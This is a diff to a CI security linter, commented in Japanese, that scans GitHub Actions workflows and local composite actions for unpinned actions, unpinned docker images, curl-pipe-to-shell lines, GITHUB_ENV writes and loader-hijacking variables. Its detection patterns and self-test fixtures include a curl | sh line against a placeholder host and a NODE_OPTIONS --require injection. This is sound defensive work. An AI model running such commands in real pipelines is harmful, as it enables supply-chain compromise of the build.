@@ -36,6 +36,19 @@
  *     `pages.yml` は「全体に `pages: write` / `id-token: write`」という**広い方**へ
  *     逃げていた (`npm ci` と組み立てが公開の権限の下で走る)。
  *
+ *  6. **ローカル action・docker://・run: の本文** (2026-10-19 · パス 530 · threat: T-120) ——
+ *     それまで `uses: ./…` と `docker://…` は**無条件に飛ばし**、`run:` は `${{ }}` の
+ *     形しか見なかった。実測 (狩り 527 の再現): `uses: ./.github/actions/x` の中身
+ *     (未固定の第三者 action・`curl | sh`) は誰にも走査されず、`run:` に
+ *     `echo "PATH=…" >> $GITHUB_ENV` や `NODE_OPTIONS=--require …` を書いても exit 0 だった。
+ *     今は ① ローカルの composite action (`.github/actions/**\/action.yml`) を workflow と
+ *     同じ規則で走査し、`uses: ./…` は**実在するその木の中**だけを指すこと ② `docker://` は
+ *     `@sha256:` のダイジェスト固定 ③ SHA 固定には版の注記 (`# v5`) を要求 ④ `run:` の
+ *     遠隔コード実行 (`curl … | sh`)・後続ステップへ効く `GITHUB_ENV` / `GITHUB_PATH` への書き込み・
+ *     ローダを差し替える環境変数 (`NODE_OPTIONS` ほか。`--max-old-space-size=N` だけは可) を断る。
+ *     ★ **40 桁の 16 進が実在の commit かは機械で確かめられない** (ネットワークが要る) —— 版の注記は
+ *     その手での確認 (`git ls-remote`) の足がかりであって保証ではない。
+ *
  * Run: node scripts/lint-workflow-security.cjs [--self-test]
  */
 const fs = require('fs');
@@ -155,15 +168,97 @@ const CROSS_CHECK = {
   roots: ['.github'],
   skipDirs: [],
   accept: (name) => /\.ya?ml$/.test(name),
-  acceptPath: (rel) => rel.startsWith('.github/workflows/') && rel.split('/').length === 3,
+  // workflow は直下の YAML、ローカル action は `.github/actions/**/action.y(a)ml` (パス 530)。
+  acceptPath: (rel) =>
+    (rel.startsWith('.github/workflows/') && rel.split('/').length === 3) ||
+    (rel.startsWith('.github/actions/') && /\/action\.ya?ml$/.test(rel)),
 };
 
-function workflows() {
-  if (!fs.existsSync(WF_DIR)) return [];
-  return fs
-    .readdirSync(WF_DIR)
-    .filter((f) => /\.ya?ml$/.test(f))
-    .map((f) => ({ name: f, text: fs.readFileSync(path.join(WF_DIR, f), 'utf8') }));
+const ACTIONS_DIR = path.join(REPO_ROOT, '.github', 'actions');
+
+/** `.github/actions/` の下の `action.yml` / `action.yaml` を再帰で拾う (経路は `/` 区切り)。 */
+function localActionFiles(dir = ACTIONS_DIR, rel = '') {
+  if (!fs.existsSync(dir)) return [];
+  const out = [];
+  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
+    const next = rel === '' ? e.name : `${rel}/${e.name}`;
+    if (e.isDirectory()) out.push(...localActionFiles(path.join(dir, e.name), next));
+    else if (/^action\.ya?ml$/.test(e.name)) out.push(next);
+  }
+  return out;
+}
+
+/** 走査の名前 —— workflow は素のファイル名、ローカル action は `actions/<dir>/action.yml`。 */
+const isLocalActionName = (name) => name.startsWith('actions/');
+
+/** 走査の名前をリポジトリ相対の経路へ (追跡ファイルとの照合用)。 */
+const scanRelPath = (name) =>
+  isLocalActionName(name) ? path.posix.join('.github', name) : path.posix.join('.github', 'workflows', name);
+
+function workflows(wfDir = WF_DIR, actionsDir = ACTIONS_DIR) {
+  const flows = fs.existsSync(wfDir)
+    ? fs
+        .readdirSync(wfDir)
+        .filter((f) => /\.ya?ml$/.test(f))
+        .map((f) => ({ name: f, text: fs.readFileSync(path.join(wfDir, f), 'utf8') }))
+    : [];
+  const actions = localActionFiles(actionsDir).map((rel) => ({
+    name: `actions/${rel}`,
+    text: fs.readFileSync(path.join(actionsDir, ...rel.split('/')), 'utf8'),
+  }));
+  return [...flows, ...actions];
+}
+
+/**
+ * `uses: ./…` (同じリポジトリ) の行き先の問題。無ければ `null`。
+ *
+ * 載せてよいのは **`.github/actions/<dir>` (その下に `action.yml` が在る)** と
+ * **`.github/workflows/<file>.yml` (再利用 workflow)** だけで、どちらも**走査の対象**になる
+ * (`names` はその一覧)。`..` で木の外へ出る形・リポジトリ直下 (`./`) ・走査に載らない
+ * 場所は、中身を誰も読まないので断る (パス 530)。
+ */
+function localUsesProblem(ref, names) {
+  const reusable = /^\.\/\.github\/workflows\/([\w.-]+\.ya?ml)$/.exec(ref);
+  if (reusable) {
+    return names.has(reusable[1]) ? null : `再利用 workflow ${reusable[1]} が見つからない`;
+  }
+  const act = /^\.\/\.github\/actions\/((?:[\w.-]+\/)*[\w.-]+)\/?$/.exec(ref);
+  // `..` / `.` を含む経路は、`names` (実際に歩いた正規の名前) に載らないので下の照合で落ちる。
+  if (!act) {
+    return '`.github/actions/<dir>` か `.github/workflows/<file>.yml` の外を指している (中身が走査されない)';
+  }
+  return names.has(`actions/${act[1]}/action.yml`) || names.has(`actions/${act[1]}/action.yaml`)
+    ? null
+    : `\`.github/actions/${act[1]}/action.yml\` が見つからない`;
+}
+
+/**
+ * ローダ・探索経路を差し替えて**後続の任意コードに効く**環境変数。`NODE_OPTIONS` は
+ * `--max-old-space-size=N` だけなら可 (mutation.yml が実際に使う)。
+ */
+const LOADER_ENV =
+  /\b(NODE_OPTIONS|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|BASH_ENV|NODE_PATH|PYTHONPATH|PYTHONSTARTUP)\s*[=:]\s*(.*)$/;
+
+/** 1 行 (注記を落とした後) の環境変数の問題。無ければ `null`。 */
+function loaderEnvProblem(line) {
+  const m = LOADER_ENV.exec(line);
+  if (!m) return null;
+  if (m[1] === 'NODE_OPTIONS' && /^["']?--max-old-space-size=\d+["']?\s*$/.test(m[2])) return null;
+  return `${m[1]} を設定している — 後続の任意コードの読み込みを差し替えられる`;
+}
+
+/** `run:` の 1 行が持つ、内容そのものの危険。無ければ `null`。 */
+function runBodyProblem(line) {
+  if (
+    /\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python3?|node|perl|ruby)\b/.test(line) ||
+    /(?:\b(?:ba|z|da|k)?sh\s+(?:-\w+\s+)*["']?|\beval\s+["']?|\bsource\s+|(?:^|\s)\.\s+)(?:\$\(|<\()\s*(?:curl|wget)\b/.test(line)
+  ) {
+    return '遠隔のコードを取得してそのまま実行している (curl | sh の形)';
+  }
+  if (/\bGITHUB_(?:ENV|PATH)\b/.test(line)) {
+    return 'GITHUB_ENV / GITHUB_PATH へ書いている — 後続のステップの環境・PATH を書き換えられる';
+  }
+  return loaderEnvProblem(line);
 }
 
 /** `run:` ブロックの行だけを取り出す (インデントで範囲を決める素朴な走査)。 */
@@ -203,8 +298,10 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
   const problems = [];
   const seenUnpinned = new Set();
   const seenJobBlocks = new Set(); // `file::job` —— 台帳の逆向きに使う
+  const names = new Set(list.map((w) => w.name));
   for (const { name, text } of list) {
-    if (!/^permissions:/m.test(text)) {
+    // composite action は `permissions:` を持てない (権限は呼び出した job のもの)。
+    if (!isLocalActionName(name) && !/^permissions:/m.test(text)) {
       problems.push({
         file: name,
         why: '`permissions:` が未宣言 — 既定 (環境によっては contents: write) を継ぐ',
@@ -261,6 +358,11 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
         why: 'pull_request_target — fork の PR が secrets 付きで走る',
       });
     }
+    // ローダを差し替える環境変数は、`env:` の鍵にも `run:` の `export X=` にも現れる —— 注記を落とした全行で見る。
+    withoutComments.split('\n').forEach((l, idx) => {
+      const why = loaderEnvProblem(l);
+      if (why) problems.push({ file: `${name}:${idx + 1}`, why });
+    });
     const lines = text.split('\n');
     // actions/github-script の `script:` は JavaScript なので、`${{ … }}` を埋め込むと信用できない値が
     // コードになる (run: と同じ注入。パス 524 · T-085)。`script:` の本体 (ブロックの続き行) を見る。
@@ -286,7 +388,22 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
       const m = /^\s*-?\s*uses:\s*([^\s#]+)/.exec(lines[i]);
       if (!m) continue;
       const ref = m[1];
-      if (ref.startsWith('./') || ref.startsWith('docker://')) continue;
+      if (ref.startsWith('./')) {
+        // 同じリポジトリの action / 再利用 workflow —— 中身は走査に載っている物だけを指させる (パス 530)。
+        const why = localUsesProblem(ref, names);
+        if (why) problems.push({ file: `${name}:${i + 1}`, why: `uses: ${ref} — ${why}` });
+        continue;
+      }
+      if (ref.startsWith('docker://')) {
+        // タグは動く。イメージはダイジェスト (`@sha256:…`) で固定する (パス 530)。
+        if (!/@sha256:[0-9a-f]{64}$/.test(ref)) {
+          problems.push({
+            file: `${name}:${i + 1}`,
+            why: `docker:// のイメージがダイジェストで固定されていません (${ref}) — \`@sha256:<64 桁>\` にすること`,
+          });
+        }
+        continue;
+      }
       /*
        * GitHub 自身 (`actions/*`) は SHA 固定を免除する —— **ただし「版のタグ」に限る**。
        *
@@ -300,6 +417,14 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
       // **SHA 固定は誰であれ常に可**。ここを `actions/` の分岐より後ろに置くと、
       // `actions/checkout@<sha>` (最も固い形) を落とす —— 実際に落とした。
       if (/@[0-9a-f]{40}$/.test(ref)) {
+        // 40 桁が実在の commit かは機械で確かめられない。せめて「どの版のつもりか」を残させる ——
+        // 手での確認 (`git ls-remote <repo> refs/tags/<tag>`) の足がかりになる (パス 530)。
+        if (!/^\s*-?\s*uses:\s*\S+\s+#\s*v?\d/.test(lines[i])) {
+          problems.push({
+            file: `${name}:${i + 1}`,
+            why: `SHA 固定に版の注記 (\`# v5\` など) が無い (${ref}) — どのタグのつもりで固定したかを残すこと`,
+          });
+        }
         if (/^actions\/checkout@/.test(ref) && !stepPersistsNoCredentials(lines, i)) {
           /*
            * **checkout は `persist-credentials: false` を要求する** (2026-10-15 · パス 522 ·
@@ -357,6 +482,14 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
           why: `run: の中で ${'$'}{{ }} を展開している — env: へ束ねて $VAR で読むこと — ${line.trim().slice(0, 80)}`,
         });
       }
+      // 内容そのものの危険 (パス 530)。シェルの注記の行は読まない。
+      if (!/^\s*#/.test(line)) {
+        const body = runBodyProblem(line);
+        // ローダ環境変数は上の全行走査が同じ行を報告済み —— 二重に鳴らさない。
+        if (body && !loaderEnvProblem(line)) {
+          problems.push({ file: `${name}:${ln}`, why: `run: — ${body} — ${line.trim().slice(0, 80)}` });
+        }
+      }
     }
   }
   // 台帳の掃除: 直したのに項目が残っていたら落とす。
@@ -367,7 +500,6 @@ function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
   }
   // job 権限の台帳の逆向き: 載っている job が実物に (同じ scope で) 無ければ落とす。
   // 残った項目は、その job が後で戻ってきたときにあらかじめ免除されている穴になる。
-  const names = new Set(list.map((w) => w.name));
   for (const [file, jobs] of Object.entries(jobAllow)) {
     for (const [job, entry] of Object.entries(jobs)) {
       if (!entry || !Array.isArray(entry.scopes) || entry.scopes.length === 0 || !entry.why) {
@@ -416,7 +548,7 @@ function selfTest() {
     ['pull_request_target を flow 配列で落とす (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\non: [push, pull_request_target]\n' }], 1],
     ['pull_request_target を引用符つきの鍵で落とす (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\non:\n  "pull_request_target":\n' }], 1],
     ['注記の中の pull_request_target は落とさない (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\n# pull_request_target は使わない\non:\n  push:\n' }], 0],
-    ['github-script の script: への ${{ }} 展開を落とす (T-085)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/github-script@${'d'.repeat(40)}\n        with:\n          script: |\n            core.info('${'$'}{{ github.event.inputs.x }}')\n` }], 1],
+    ['github-script の script: への ${{ }} 展開を落とす (T-085)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/github-script@${'d'.repeat(40)} # v1\n        with:\n          script: |\n            core.info('${'$'}{{ github.event.inputs.x }}')\n` }], 1],
     [
       '第三者 action のタグ固定を落とす',
       [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@v1\n' }],
@@ -424,7 +556,7 @@ function selfTest() {
     ],
     [
       '第三者 action の SHA 固定は通す',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@${'a'.repeat(40)}\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@${'a'.repeat(40)} # v1\n` }],
       0,
     ],
     [
@@ -439,22 +571,22 @@ function selfTest() {
     ],
     [
       'checkout が persist-credentials を持たなければ落とす (T-056)',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)}\n      - run: echo hi\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n      - run: echo hi\n` }],
       1,
     ],
     [
       'checkout の persist-credentials: true は「持たない」と数える',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)}\n        with:\n          persist-credentials: true\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n        with:\n          persist-credentials: true\n` }],
       1,
     ],
     [
       '次の step の with: は数えない (段で区切る)',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)}\n      - uses: actions/setup-node@${'b'.repeat(40)}\n        with:\n          persist-credentials: false\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n      - uses: actions/setup-node@${'b'.repeat(40)} # v1\n        with:\n          persist-credentials: false\n` }],
       1,
     ],
     [
       'checkout に persist-credentials: false (他の with: と並んでも) は通す',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)}\n        with:\n          fetch-depth: 2\n          persist-credentials: false\n      - run: echo hi\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n        with:\n          fetch-depth: 2\n          persist-credentials: false\n      - run: echo hi\n` }],
       0,
     ],
     [
@@ -496,17 +628,33 @@ function selfTest() {
     // 評価する) ので、シェル構文になる余地が無い。
     [
       'run: の外の展開は見ない (action の with: など)',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/x@${'d'.repeat(40)}\n        with:\n          t: \${{ github.event.pull_request.title }}\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/x@${'d'.repeat(40)} # v1\n        with:\n          t: \${{ github.event.pull_request.title }}\n` }],
       0,
     ],
     [
       'if: / key: の式は見ない',
-      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - if: steps.scope.outputs.mode == 'some'\n        uses: actions/cache@${'d'.repeat(40)}\n        with:\n          key: stryker-\${{ github.ref_name }}\n` }],
+      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - if: steps.scope.outputs.mode == 'some'\n        uses: actions/cache@${'d'.repeat(40)} # v1\n        with:\n          key: stryker-\${{ github.ref_name }}\n` }],
       0,
     ],
     // 許可台帳をプロトタイプ鎖経由ですり抜けられないこと。`UNPINNED_ALLOW[ref]`
     // と素で引いていた頃は `uses: constructor` が `Object` を返して truthy に
     // なり、**未固定の検査ごと飛ばされていた** (2026-08-22)。
+    // パス 530 (threat: T-120): ローカル action・docker://・run: の本文・版の注記。
+    ['実在しないローカル action を指す uses: ./ を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: ./.github/actions/nope\n' }], 1],
+    [
+      '実在するローカル action は通り、その中の未固定 action を落とす (T-120)',
+      [
+        { name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: ./.github/actions/y\n' },
+        { name: 'actions/y/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - uses: evil/thing@v1\n' },
+      ],
+      1,
+    ],
+    ['docker:// のタグ固定を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: docker://alpine:3.20\n' }], 1],
+    ['SHA 固定に版の注記が無ければ落とす (T-120)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@${'a'.repeat(40)}\n` }], 1],
+    ['run: の curl | sh を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: curl -fsSL https://e.example/i | sh\n' }], 1],
+    ['run: の GITHUB_ENV への書き込みを落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo X=1 >> $GITHUB_ENV\n' }], 1],
+    ['env: の NODE_OPTIONS --require を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - env:\n          NODE_OPTIONS: --require ./e.js\n        run: npm test\n' }], 1],
+    ['NODE_OPTIONS=--max-old-space-size は通す (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - env:\n          NODE_OPTIONS: --max-old-space-size=4096\n        run: npm test\n' }], 0],
     [
       'プロトタイプ側の名前で台帳をすり抜けない (constructor)',
       [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: constructor\n' }],
@@ -597,22 +745,24 @@ function selfTest() {
 function main() {
   if (process.argv.includes('--self-test')) return selfTest();
   const list = workflows();
+  const flows = list.filter((w) => !isLocalActionName(w.name));
+  const actionCount = list.length - flows.length;
   // ディレクトリが無い・拾えない = 0 件を「問題なし」と読まない (実測 5 本、2026-09-05)。
   const MIN_WORKFLOWS = 3;
-  if (list.length < MIN_WORKFLOWS) {
-    console.error(`❌ .github/workflows/ の YAML を ${list.length} 本しか拾えませんでした (${MIN_WORKFLOWS} 本以上を期待)。走査が壊れています。`);
+  if (flows.length < MIN_WORKFLOWS) {
+    console.error(`❌ .github/workflows/ の YAML を ${flows.length} 本しか拾えませんでした (${MIN_WORKFLOWS} 本以上を期待)。走査が壊れています。`);
     process.exit(1);
   }
-  // 2 つ目の数え方: 追跡されている workflow は、どれも走査に出る (パス 472)。
+  // 2 つ目の数え方: 追跡されている workflow とローカル action は、どれも走査に出る (パス 472 / 530)。
   const cross = reportTrackedCrossCheck(
-    list.map((w) => path.join('.github', 'workflows', w.name)), CROSS_CHECK, REPO_ROOT, 'lint:workflow-security');
+    list.map((w) => scanRelPath(w.name)), CROSS_CHECK, REPO_ROOT, 'lint:workflow-security');
   if (cross.code !== 0) process.exit(1);
   const problems = check(list);
   const ledger = Object.keys(UNPINNED_ALLOW).length;
   const jobLedger = Object.values(JOB_PERMISSIONS_ALLOW).reduce((n, jobs) => n + Object.keys(jobs).length, 0);
   console.log(
-    `Checked ${list.length} workflow(s): permissions / 第三者 action の SHA 固定 / ` +
-      `pull_request_target / run: への ${'$'}{{ }} 展開 / job 単位の permissions (台帳: 未固定 ${ledger} 件 · job 権限 ${jobLedger} 件 · ${crossCheckSuffix(cross.source)})`,
+    `Checked ${flows.length} workflow(s) + ${actionCount} local action(s): permissions / 第三者 action の SHA 固定 / ` +
+      `pull_request_target / run: への ${'$'}{{ }} 展開 / run: の本文 (遠隔コード・GITHUB_ENV・ローダ環境変数) / ローカル action・docker:// / job 単位の permissions (台帳: 未固定 ${ledger} 件 · job 権限 ${jobLedger} 件 · ${crossCheckSuffix(cross.source)})`,
   );
   if (problems.length === 0) {
     console.log('✅ ワークフローの守りは台帳どおりです');
@@ -626,6 +776,6 @@ function main() {
   return 1;
 }
 
-module.exports = { check, runBlockLines, workflows, jobPermissionBlocks, UNPINNED_ALLOW, JOB_PERMISSIONS_ALLOW, CROSS_CHECK };
+module.exports = { check, runBlockLines, workflows, localActionFiles, localUsesProblem, loaderEnvProblem, runBodyProblem, scanRelPath, isLocalActionName, jobPermissionBlocks, UNPINNED_ALLOW, JOB_PERMISSIONS_ALLOW, CROSS_CHECK };
 
 if (require.main === module) process.exit(main());
